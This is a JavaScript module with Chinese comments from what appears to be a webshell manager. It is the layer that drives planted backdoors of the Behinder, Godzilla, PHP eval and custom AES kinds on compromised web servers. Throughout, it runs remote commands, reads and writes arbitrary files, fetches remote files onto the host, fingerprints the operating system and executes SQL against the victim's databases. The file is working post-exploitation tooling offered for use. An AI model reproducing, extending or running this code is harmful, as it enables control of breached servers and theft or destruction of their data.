// dsh-webshell-mgr 能力层：把各通道的原语（命令执行 / eval 代码 / 二进制读写操作码）
// 组合成统一的高级操作面（目录/文件/信息/数据库）。策略固定三级：
//   ① 原生操作码（dsh-aes 的 u/d —— 二进制安全、结构最稳）
//   ② eval 片段（cmd-eval PHP 马 / dsh-aes v2 e 操作码 —— 结构化 JSON，覆盖最全）
//   ③ 命令翻译（所有 cmd 能力通道兜底 —— ls/dir 解析、base64 分块）
// 每连接的 OS 与 v2-eval 能力探测结果进程内缓存（探测代价一次）。

import { cmd as aesCmd, writeFile as aesWrite, readFile as aesRead, evalPhp as aesEval, probeEval as aesProbeEval } from "./dsh-aes.js";
import { systemExec, phpEval } from "./cmd.js";
import { runCommand as bmodRun } from "./behinder-mod.js";
import { runCommand as gmodRun } from "./godzilla-mod.js";
import { evalPhp as behinderEval } from "./behinder.js";
import { evalPhp as godzillaEval, invalidate as godzillaInvalidate } from "./godzilla.js";
import * as cb from "./command-build.js";
import * as sn from "./snippets.js";
import { unb64 } from "./http-client.js";

const osCache = new Map(); // connId → 'linux'|'windows'
const evalCache = new Map(); // connId → boolean（eval 片段能力）

const UPLOAD_CHUNK_RAW = 24000; // 命令通道分块（b64 后 32KB，留命令行余量）

/** 通道原生命令执行（所有协议统一入口）。 */
export async function runCommand(conn, command) {
	switch (conn.protocol) {
		case "dsh-aes": return aesCmd(conn, command);
		case "cmd-eval": return phpEval(conn, sn.phpExec(command));
		case "cmd-system": return systemExec(conn, command);
		case "behinder": return behinderEval(conn, sn.phpExec(command));
		case "godzilla": return godzillaEval(conn, sn.phpExec(command));
		// 魔改通道的哨兵分隔符只看连接显式 OS（不回探——避免与 osOf 互相递归）
		case "behinder-mod": return bmodRun(conn, command, conn.os === "windows" ? "windows" : "linux");
		case "godzilla-mod": return (await gmodRun(conn, command)).toString("utf8");
		default: throw new Error(`通道 ${conn.protocol} 暂不支持命令执行`);
	}
}

/** eval 片段能力：桥接载荷通道恒真；dsh-aes 需 v2（e 操作码）探测一次。 */
export async function canEval(conn) {
	if (conn.protocol === "cmd-eval" && conn.shell_lang === "php") return true;
	if (conn.protocol === "behinder" || conn.protocol === "godzilla") return true;
	if (conn.protocol !== "dsh-aes") return false;
	const k = conn.id ?? conn.url;
	if (!evalCache.has(k)) evalCache.set(k, await aesProbeEval(conn));
	return evalCache.get(k);
}

/** 执行 PHP 片段并提取结构化结果。 */
export async function runSnippet(conn, code) {
	if (conn.protocol === "cmd-eval") return sn.extractMarked(await phpEval(conn, code));
	if (conn.protocol === "dsh-aes") return sn.extractMarked(await aesEval(conn, code));
	if (conn.protocol === "behinder") return sn.extractMarked(await behinderEval(conn, code));
	if (conn.protocol === "godzilla") return sn.extractMarked(await godzillaEval(conn, code));
	throw new Error("当前通道无 eval 能力——仅 PHP eval 马与自研/桥接通道支持结构化操作");
}

/** OS 解析：连接配置显式指定优先，auto 则探测一次（%OS% 回显技巧）。 */
export async function osOf(conn) {
	const explicit = conn.os;
	if (explicit === "linux" || explicit === "windows") return explicit;
	const k = conn.id ?? conn.url;
	if (osCache.has(k)) return osCache.get(k);
	const out = await runCommand(conn, cb.OS_PROBE_COMMAND);
	const parsed = cb.parseOsProbe(out);
	if (!parsed) throw new Error("OS 探测失败：无法识别回显");
	osCache.set(k, parsed);
	return parsed;
}

/** 基本信息（结构化优先）。 */
export async function basicInfo(conn) {
	if (await canEval(conn)) {
		const r = await runSnippet(conn, sn.phpBasicInfo());
		if (r && !r.error) {
			return {
				user: r.user, os: r.osFamily === "Windows" ? "windows" : "linux", osDetail: r.uname,
				cwd: r.cwd, php: r.php, sapi: r.sapi, disabledFunctions: r.disabled, raw: r
			};
		}
	}
	const os = await osOf(conn);
	const out = await runCommand(conn, cb.basicInfoCommand(os));
	const info = cb.parseBasicInfo(out, os);
	return { user: info.user, os, cwd: info.cwd, osDetail: info.extra };
}

//#region 文件操作

/** 目录列表 → [{name,isDir,size,perm,owner,mtime,epoch,writable}]。 */
export async function listDir(conn, path) {
	if (await canEval(conn)) {
		const r = await runSnippet(conn, sn.phpLs(path));
		if (Array.isArray(r)) {
			return r.map((e) => ({ name: e.n, isDir: Boolean(e.d), size: Number(e.s) || 0, perm: e.p ?? "", owner: "", mtime: e.m ? new Date(e.m * 1000).toISOString().slice(0, 19).replace("T", " ") : "", epoch: Number(e.m) || 0, writable: Boolean(e.w) }));
		}
		if (r?.error) throw new Error(`列目录失败：${r.error}`);
	}
	const os = await osOf(conn);
	const out = await runCommand(conn, cb.buildFileCommand("ls", { path }, os));
	const entries = os === "windows" ? cb.parseDir(out) : cb.parseLs(out);
	return entries.map((e) => ({
		name: e.name, isDir: e.isDir, size: e.size, perm: e.perm ?? "", owner: e.owner ?? "",
		mtime: e.mtime ?? "", epoch: 0, writable: null
	}));
}

/** 读文件（二进制安全）→ Buffer。 */
export async function readFile(conn, path) {
	if (conn.protocol === "dsh-aes") return aesRead(conn, path);
	if (await canEval(conn)) {
		const r = await runSnippet(conn, sn.phpRead(path));
		if (r?.error) throw new Error(`读取失败：${r.error}`);
		if (typeof r?.b64buffer === "string") return unb64(r.b64buffer);
	}
	const os = await osOf(conn);
	const out = await runCommand(conn, cb.buildFileCommand("read", { path }, os));
	return unb64(cb.cleanB64Output(out));
}

/** 写文件（二进制安全，自动分块）。 */
export async function writeFile(conn, path, data) {
	const buf = Buffer.isBuffer(data) ? data : Buffer.from(data);
	if (conn.protocol === "dsh-aes") return aesWrite(conn, path, buf);
	// do-while：空文件也要写一轮（file_put_contents 空串=创建空文件），否则 0 字节假成功
	let off = 0, first = true;
	do {
		const chunkB64 = buf.subarray(off, off + UPLOAD_CHUNK_RAW).toString("base64");
		if (await canEval(conn)) {
			const r = await runSnippet(conn, first ? sn.phpWrite(path, chunkB64) : sn.phpAppend(path, chunkB64));
			if (r?.ok === false) throw new Error("马侧写入失败");
		} else {
			const os = await osOf(conn);
			await runCommand(conn, cb.buildFileCommand(first ? "write-first" : "write-append", { path, b64: chunkB64 }, os));
		}
		off += UPLOAD_CHUNK_RAW;
		first = false;
	} while (off < buf.length);
	return { ok: true, size: buf.length };
}

/** 通用文件动作（删除/建目录/移动/权限/时间戳/远程下载/校验）。 */
export async function fileAction(conn, action, a) {
	const viaSnippet = {
		delete: () => sn.phpDelete(a.path),
		"delete-dir": () => sn.phpDelete(a.path),
		mkdir: () => sn.phpMkdir(a.path),
		mv: () => sn.phpMv(a.from, a.to),
		copy: () => sn.phpCopy(a.from, a.to),
		chmod: () => sn.phpChmod(a.path, a.mode),
		touch: () => sn.phpTouch(a.path, a.epoch),
		stat: () => sn.phpStat(a.path),
		wget: () => sn.phpWget(a.url, a.to ?? a.path),
		hash: () => sn.phpHash(a.path),
		roots: () => sn.phpRoots()
	}[action];
	if (viaSnippet && (await canEval(conn))) {
		const r = await runSnippet(conn, viaSnippet());
		if (r?.error) throw new Error(`操作失败：${r.error}`);
		return r;
	}
	const os = await osOf(conn);
	if (action === "roots") return { roots: os === "windows" ? ["C:\\"] : ["/"] };
	if (action === "stat" && os === "windows") {
		const out = await runCommand(conn, cb.buildFileCommand("stat-win", a, os));
		return { mtime: out.trim() };
	}
	const out = await runCommand(conn, cb.buildFileCommand(action, a, os));
	if (action === "stat") {
		const [m, at, ct] = String(out).trim().split("|");
		return { epoch: Number(m) || 0, atime: Number(at) || 0, ctime: Number(ct) || 0, mtime: new Date((Number(m) || 0) * 1000).toISOString().slice(0, 19).replace("T", " ") };
	}
	if (action === "hash") {
		const m = /([0-9a-f]{32})/i.exec(String(out));
		return { md5: m ? m[1] : "" };
	}
	return { ok: true, output: String(out).trim() };
}

//#endregion

//#region 数据库（eval 能力通道走 PDO 片段；其余报错提示 CLI 路线未启用）

export async function dbQuery(conn, profile, sql) {
	const r = await runSnippet(conn, sn.phpDbQuery(profile, sql));
	if (r?.error) throw new Error(`SQL 执行失败：${r.error}`);
	return r;
}

export async function dbDatabases(conn, profile) {
	const r = await runSnippet(conn, sn.phpDbDatabases(profile));
	if (r?.error) throw new Error(`库列表失败：${r.error}`);
	return r.databases ?? [];
}

export async function dbTables(conn, profile, database) {
	const r = await runSnippet(conn, sn.phpDbTables(profile, database));
	if (r?.error) throw new Error(`表列表失败：${r.error}`);
	return r.tables ?? [];
}

export async function dbTableInfo(conn, profile, database, table) {
	const r = await runSnippet(conn, sn.phpDbTableInfo(profile, database, table));
	if (r?.error) throw new Error(`表结构失败：${r.error}`);
	return r;
}

//#endregion

/** 探测缓存清理（连接删除/编辑后）。 */
export function invalidateConn(connId) {
	osCache.delete(connId);
	evalCache.delete(connId);
	godzillaInvalidate(connId);
}
